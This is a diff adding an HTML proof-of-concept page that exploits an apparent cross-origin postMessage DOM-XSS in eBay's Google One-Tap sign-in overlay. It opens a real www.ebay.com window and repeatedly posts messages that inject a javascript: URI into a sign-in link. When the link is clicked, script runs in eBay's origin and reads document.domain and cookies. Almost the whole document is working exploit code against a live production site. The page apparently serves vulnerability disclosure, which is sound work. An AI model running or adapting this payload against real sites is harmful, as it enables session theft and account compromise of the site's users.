@@ -1,0 +1,53 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>eBay Google-YOLO postMessage DOM-XSS PoC</title>
+<style>
+  body{font-family:system-ui,Arial,sans-serif;max-width:720px;margin:40px auto;padding:0 18px;line-height:1.5}
+  h1{font-size:20px}
+  button{font-size:18px;padding:12px 22px;cursor:pointer;border:0;border-radius:8px;background:#0654ba;color:#fff}
+  code{background:#f2f2f2;padding:1px 5px;border-radius:4px}
+  .n{color:#555;font-size:14px}
+</style>
+</head>
+<body>
+<h1>eBay global-header Google One-Tap (YOLO) &mdash; cross-origin postMessage DOM-XSS</h1>
+<p class="n">Click the button. A real <code>www.ebay.com/globaldeals</code> window opens. This page (a foreign
+origin) then posts two <code>window.postMessage</code> messages to it: one reveals the sign-in overlay, one
+poisons the "link this account" link's <code>href</code> with a <code>javascript:</code> URI. In the eBay
+window, click <b>&ldquo;link this account&rdquo;</b> &rarr; script runs in the <code>www.ebay.com</code> origin.</p>
+
+<button id="go">Open eBay &amp; inject</button>
+<p class="n" id="status"></p>
+
+<script>
+// Attacker-controlled javascript: URI written verbatim into eBay's #signin_status <a> href.
+// Payload runs in the www.ebay.com origin: visible repaint + alert proving document.domain + readable cookies.
+var PAYLOAD = "javascript:void(function(){document.body.style.background='#b30000';"
+  + "document.title='PMXSS www.ebay.com';"
+  + "alert('PMXSS-zqx7k \\u2014 origin: '+document.domain+'\\ncookies readable: '+document.cookie.slice(0,60));"
+  + "}())";
+
+document.getElementById('go').onclick = function(){
+  var w = window.open('https://www.ebay.com/globaldeals', 'ebxss',
+                      'popup=yes,width=1040,height=820,left=120,top=80');
+  if(!w){ document.getElementById('status').textContent =
+          'Popup blocked — allow popups for this page and click again.'; return; }
+  var n = 0;
+  var t = setInterval(function(){
+    try {
+      // 1) reveal the YOLO overlay container (adds the "yolo-show" class)
+      w.postMessage({type:'_yolo', yoloHeight:420}, '*');
+      // 2) drive handleSignInFail -> render the LINK_ERR link -> set its href = linkUrl (raw)
+      w.postMessage({status:'LINK_ERR', linkUrl: PAYLOAD}, '*');
+    } catch(e){}
+    if(++n > 25) clearInterval(t);        // ~20s of retries to cover the page-load race
+  }, 800);
+  document.getElementById('status').textContent =
+    'Messages posting to the eBay window… in it, click "link this account".';
+};
+</script>
+</body>
+</html>
